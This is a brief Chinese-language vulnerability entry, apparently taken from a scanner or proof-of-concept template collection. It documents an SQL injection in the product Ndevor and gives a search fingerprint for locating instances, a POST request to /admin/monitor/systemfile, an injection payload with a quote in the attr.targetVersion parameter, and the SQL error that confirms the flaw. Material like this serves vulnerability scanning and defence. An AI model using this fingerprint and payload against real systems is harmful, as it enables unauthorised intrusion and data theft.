# 自动识别技术Ndevor存在SQL注入漏洞

自动识别技术 ｜ SQL注入 ｜ —
- **指纹**：`title="Ndevor"`
- **请求**：`POST /admin/monitor/systemfile HTTP/1.1`

**Payload**
```
attr.targetVersion='&attr.deltaVersion=&attr.fullVersion=&search=&totalRecords=1&pageNo=1&recordsperpage=10&length=10
```
- **响应特征**：200 You have an error in your SQL syntax